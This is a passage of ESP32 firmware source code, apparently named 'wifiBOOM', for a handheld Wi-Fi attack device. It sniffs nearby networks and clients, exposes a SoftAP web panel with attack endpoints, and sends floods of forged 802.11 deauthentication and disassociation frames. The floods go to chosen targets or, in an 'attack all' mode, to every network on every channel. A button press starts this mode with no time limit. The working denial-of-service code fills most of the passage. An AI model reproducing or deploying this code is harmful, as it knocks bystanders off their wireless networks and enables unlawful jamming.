            memset(networks, 0, sizeof(networks));
            network_count = 0;
        } else {
            for (uint16_t i = 0; i < network_count; ++i) {
                if (memcmp(networks[i].bssid, b, 6) == 0) {
                    memmove(&networks[i], &networks[i + 1], (network_count - i - 1) * sizeof(network_t));
                    --network_count;
                    memset(&networks[network_count], 0, sizeof(network_t));
                    changed = true;
                    break;
                }
            }
        }
    } else {
        if (clear) {
            changed = pair_count > 0;
            memset(pairs, 0, sizeof(pairs));
            pair_count = 0;
            memset(pair_hash_table, 0, sizeof(pair_hash_table));
        } else {
            for (uint16_t i = 0; i < pair_count; ++i) {
                if (memcmp(pairs[i].bssid, b, 6) == 0 && memcmp(pairs[i].sta, a, 6) == 0) {
                    memmove(&pairs[i], &pairs[i + 1], (pair_count - i - 1) * sizeof(pair_t));
                    --pair_count;
                    memset(&pairs[pair_count], 0, sizeof(pair_t));
                    rebuild_pair_hash_table();
                    changed = true;
                    break;
                }
            }
        }
    }
    xSemaphoreGive(mutex);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, changed ? "{\"changed\":true}" : "{\"changed\":false}");
    return ESP_OK;
}

static esp_err_t index_get_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, index_html_start, index_html_end - index_html_start);
    return ESP_OK;
}

static esp_err_t start_webserver(void) {
    if (server_handle != NULL) return ESP_OK;

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.lru_purge_enable = true;

    esp_err_t err = httpd_start(&server_handle, &config);
    if (err != ESP_OK) {
        server_handle = NULL;
        return err;
    }

    httpd_uri_t index_uri = { .uri = "/", .method = HTTP_GET, .handler = index_get_handler };
    httpd_uri_t status_uri = { .uri = "/api/status", .method = HTTP_GET, .handler = status_get_handler };
    httpd_uri_t networks_uri = { .uri = "/api/networks", .method = HTTP_GET, .handler = networks_get_handler };
    httpd_uri_t stations_uri = { .uri = "/api/stations", .method = HTTP_GET, .handler = stations_get_handler };
    httpd_uri_t attack_uri = { .uri = "/api/attack", .method = HTTP_POST, .handler = attack_post_handler };
    httpd_uri_t scan_uri = { .uri = "/api/scan", .method = HTTP_POST, .handler = scan_post_handler };
    httpd_uri_t table_uri = { .uri = "/api/table/manage", .method = HTTP_POST, .handler = table_manage_post_handler };

    httpd_register_uri_handler(server_handle, &index_uri);
    httpd_register_uri_handler(server_handle, &status_uri);
    httpd_register_uri_handler(server_handle, &networks_uri);
    httpd_register_uri_handler(server_handle, &stations_uri);
    httpd_register_uri_handler(server_handle, &attack_uri);
    httpd_register_uri_handler(server_handle, &scan_uri);
    httpd_register_uri_handler(server_handle, &table_uri);

    return ESP_OK;
}

static esp_err_t stop_webserver(void) {
    if (server_handle != NULL) {
        httpd_stop(server_handle);
        server_handle = NULL;
    }
    return ESP_OK;
}

static void set_system_state(system_state_t st, bool scan, bool attack) {
    current_state = st;
    scan_active = scan;
    attack_active = attack;
    if (!attack) attack_all = false;
}

static bool transition_to_control_phase(void) {
    set_system_state(STATE_SWITCHING, false, false);
    ESP_LOGI(TAG, "Switching to Control Phase (SoftAP)...");

    if (esp_wifi_set_promiscuous(false) != ESP_OK ||
        esp_wifi_stop() != ESP_OK ||
        esp_wifi_set_mode(WIFI_MODE_AP) != ESP_OK) {
        set_system_state(STATE_ERROR, false, false);
        return false;
    }
    
    wifi_config_t ap_config = {
        .ap = {
            .ssid = AP_SSID,
            .ssid_len = strlen(AP_SSID),
            .password = AP_PASS,
            .channel = AP_CHANNEL,
            .max_connection = AP_MAX_CONN,
            .authmode = WIFI_AUTH_WPA2_PSK,
        },
    };
    
    if (esp_wifi_set_config(WIFI_IF_AP, &ap_config) != ESP_OK ||
        esp_wifi_start() != ESP_OK ||
        start_webserver() != ESP_OK) {
        set_system_state(STATE_ERROR, false, false);
        return false;
    }

    set_system_state(STATE_CONTROL, false, false);
    gpio_set_level(LED_GPIO, 0);
    return true;
}

static bool transition_to_scanning_phase(void) {
    set_system_state(STATE_SWITCHING, false, false);

    if (stop_webserver() != ESP_OK ||
        esp_wifi_stop() != ESP_OK ||
        esp_wifi_set_mode(WIFI_MODE_STA) != ESP_OK ||
        esp_wifi_start() != ESP_OK) {
        set_system_state(STATE_ERROR, false, false);
        return false;
    }

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT
    };
    if (esp_wifi_set_promiscuous_filter(&filter) != ESP_OK ||
        esp_wifi_set_promiscuous_rx_cb(wifi_sniffer) != ESP_OK ||
        esp_wifi_set_promiscuous(true) != ESP_OK) {
        set_system_state(STATE_ERROR, false, false);
        return false;
    }

    set_system_state(STATE_SCANNING, true, false);
    scan_start_timestamp = esp_timer_get_time() / 1000;
    current_scan_channel = FIRST_CHANNEL;
    last_channel_switch_tick = esp_timer_get_time() / 1000;

    if (esp_wifi_set_channel(FIRST_CHANNEL, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        set_system_state(STATE_ERROR, false, false);
        return false;
    }
    current_scan_channel = FIRST_CHANNEL + 1;
    gpio_set_level(LED_GPIO, 0);
    return true;
}

static bool transition_to_attack_phase(void) {
    set_system_state(STATE_SWITCHING, false, false);

    if (stop_webserver() != ESP_OK ||
        esp_wifi_stop() != ESP_OK ||
        esp_wifi_set_mode(WIFI_MODE_STA) != ESP_OK ||
        esp_wifi_start() != ESP_OK) {
        set_system_state(STATE_ERROR, false, false);
        return false;
    }
    vTaskDelay(pdMS_TO_TICKS(300));
    set_system_state(STATE_ATTACK, false, true);
    return true;
}

static void button_task(void *pvParameter) {
    int last_state = 1;
    while (1) {
        int current_state_gpio = gpio_get_level(BUTTON_GPIO);
        if (last_state == 1 && current_state_gpio == 0) {
            uint32_t dummy = 1;
            if (xQueueSend(button_event_queue, &dummy, 0) != pdTRUE) {
                xQueueReceive(button_event_queue, &dummy, 0);
                xQueueSend(button_event_queue, &dummy, 0);
            }
            vTaskDelay(pdMS_TO_TICKS(300));
        }
        last_state = current_state_gpio;
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}

void app_main(void) {
    gpio_config_t io_conf_led = {
        .pin_bit_mask = (1ULL << LED_GPIO),
        .mode = GPIO_MODE_OUTPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE
    };
    gpio_config(&io_conf_led);
    gpio_set_level(LED_GPIO, 0);

    gpio_config_t io_conf_btn = {
        .pin_bit_mask = (1ULL << BUTTON_GPIO),
        .mode = GPIO_MODE_INPUT,
        .pull_up_en = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE
    };
    gpio_config(&io_conf_btn);

    pairs_mutex = xSemaphoreCreateMutex();
    networks_mutex = xSemaphoreCreateMutex();
    configASSERT(pairs_mutex != NULL);
    configASSERT(networks_mutex != NULL);

    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    ap_netif = esp_netif_create_default_wifi_ap();
    configASSERT(ap_netif != NULL);

    observation_queue = xQueueCreate(OBS_QUEUE_LENGTH, sizeof(observation_t));
    beacon_queue = xQueueCreate(BEACON_QUEUE_LENGTH, sizeof(beacon_info_t));
    command_queue = xQueueCreate(CMD_QUEUE_LENGTH, sizeof(system_cmd_t));
    button_event_queue = xQueueCreate(BTN_QUEUE_LENGTH, sizeof(uint32_t));
    
    configASSERT(observation_queue != NULL);
    configASSERT(beacon_queue != NULL);
    configASSERT(command_queue != NULL);
    configASSERT(button_event_queue != NULL);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    xTaskCreate(pair_collector_task, "pair_collector", 4096, NULL, 5, NULL);
    xTaskCreate(network_collector_task, "net_collector", 4096, NULL, 5, NULL);
    xTaskCreate(button_task, "button_task", 4096, NULL, 10, NULL);

    scan_duration_ms = 15000;
    if (!transition_to_scanning_phase()) {
        set_system_state(STATE_ERROR, false, false);
        ESP_LOGE(TAG, "Scan phase could not be started!");
    }

    printf("=========================================\n");
    printf(" wifiBOOM SYSTEM READY (15s Initial Scan)\n");
    printf("=========================================\n");

    system_cmd_t cmd;
    uint32_t btn_signal;

    while (1) {
        if (xQueueReceive(button_event_queue, &btn_signal, 0) == pdTRUE) {
            xQueueReset(command_queue);
            system_state_t st = current_state;

            if (st == STATE_CONTROL) {
                if (transition_to_attack_phase()) {
                    attack_active = true;
                    attack_all = true;
                    attack_subtype = 0;
                    attack_duration_ms = 0; // Infinite
                    attack_start_timestamp = esp_timer_get_time() / 1000;
                    gpio_set_level(LED_GPIO, 1);
                    ESP_LOGI(TAG, "INFINITY ATTACK ALL STARTED VIA BOOT BUTTON");
                }
            } else {
                transition_to_control_phase();
            }
            continue;
        }

        if (xQueueReceive(command_queue, &cmd, pdMS_TO_TICKS(10)) == pdTRUE) {
            system_state_t st = current_state;
            switch (cmd.type) {
                case CMD_START_SCAN:
                    if (st == STATE_CONTROL) {
                        scan_duration_ms = cmd.duration_ms;
                        transition_to_scanning_phase();
                    }
                    break;
                case CMD_START_ATTACK:
                    if (st == STATE_CONTROL) {
                        if (transition_to_attack_phase()) {
                            attack_active = true;
                            attack_all = cmd.attack_all;
                            attack_mode = cmd.mode;
                            attack_subtype = cmd.subtype;
                            attack_direction = cmd.direction;
                            attack_duration_ms = cmd.duration_ms;
                            target_channel = cmd.channel;
                            memcpy(target_bssid, cmd.bssid, 6);
                            memcpy(target_sta, cmd.sta, 6);
                            attack_start_timestamp = esp_timer_get_time() / 1000;
                            gpio_set_level(LED_GPIO, 1);
                            ESP_LOGI(TAG, "ATTACK STARTED");
                        }
                    }
                    break;
                default:
                    break;
            }
        }

        system_state_t loop_st = current_state;
        bool loop_a_act = attack_active;

        if (loop_st == STATE_SCANNING) {
            int64_t now_ms = esp_timer_get_time() / 1000;
            if (scan_duration_ms > 0 && (now_ms - scan_start_timestamp) >= scan_duration_ms) {
                led_blink(2, 200);
                transition_to_control_phase();
                continue;
            }
            if ((now_ms - last_channel_switch_tick) >= DWELL_MS) {
                if (esp_wifi_set_channel(current_scan_channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
                    current_scan_channel++;
                    if (current_scan_channel > LAST_CHANNEL) current_scan_channel = FIRST_CHANNEL;
                }
                last_channel_switch_tick = now_ms;
            }
        } else if (loop_st == STATE_ATTACK) {
            if (loop_a_act) {
                int64_t now_ms = esp_timer_get_time() / 1000;
                if (attack_duration_ms > 0 && (now_ms - attack_start_timestamp) >= attack_duration_ms) {
                    attack_active = false;
                    attack_all = false;
                    gpio_set_level(LED_GPIO, 0);
                    transition_to_control_phase();
                    ESP_LOGI(TAG, "ATTACK DURATION EXPIRED");
                    continue;
                }

                if (attack_all) {
                    for (uint8_t ch = FIRST_CHANNEL; ch <= LAST_CHANNEL; ch++) {
                        if (!attack_active) break;
                        bool channel_has_networks = false;
                        for (int i = 0; i < network_count; i++) {
                            if (networks[i].channel == ch) { channel_has_networks = true; break; }
                        }
                        if (!channel_has_networks) continue;

                        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

                        for (int i = 0; i < network_count; i++) {
                            network_t *n = &networks[i];
                            if (n->channel != ch) continue;
                            if (!attack_active) break;

                            for (int burst = 0; burst < 3; burst++) {
                                if (attack_subtype == 0) {
                                    custom_send_deauth((const uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, n->bssid, n->bssid, REASON_PREV_AUTH_INVALID);
                                } else {
                                    custom_send_disassoc((const uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, n->bssid, n->bssid, REASON_DISASSOC_DUE_TO_INACTIVITY);
                                }
                                vTaskDelay(pdMS_TO_TICKS(10));
                            }
                        }
                    }
                    vTaskDelay(pdMS_TO_TICKS(30));
                } else {
                    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
                    for (int burst = 0; burst < 4; burst++) {
                        if (attack_mode == 0) {
                            if (attack_subtype == 0) {
                                custom_send_deauth((const uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, target_bssid, target_bssid, REASON_PREV_AUTH_INVALID);
                            } else {
                                custom_send_disassoc((const uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, target_bssid, target_bssid, REASON_DISASSOC_DUE_TO_INACTIVITY);
                            }
                        } else {
                            if (attack_subtype == 0) {
                                if (attack_direction == 0) custom_send_deauth(target_sta, target_bssid, target_bssid, REASON_PREV_AUTH_INVALID);
                                else custom_send_deauth(target_bssid, target_sta, target_bssid, REASON_DEAUTH_LEAVING);
                            } else {
                                if (attack_direction == 0) custom_send_disassoc(target_sta, target_bssid, target_bssid, REASON_DISASSOC_DUE_TO_INACTIVITY);
                                else custom_send_disassoc(target_bssid, target_sta, target_bssid, REASON_DISASSOC_STA_HAS_LEFT);
                            }
                        }
                        vTaskDelay(pdMS_TO_TICKS(15));
                    }
                    vTaskDelay(pdMS_TO_TICKS(30));
                }
            } else {
                vTaskDelay(pdMS_TO_TICKS(50));
            }
        } else if (loop_st == STATE_CONTROL) {
            vTaskDelay(pdMS_TO_TICKS(100));
        } else if (loop_st == STATE_ERROR) {
            gpio_set_level(LED_GPIO, 1);
            vTaskDelay(pdMS_TO_TICKS(200));
            gpio_set_level(LED_GPIO, 0);
            vTaskDelay(pdMS_TO_TICKS(800));
        } else {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}
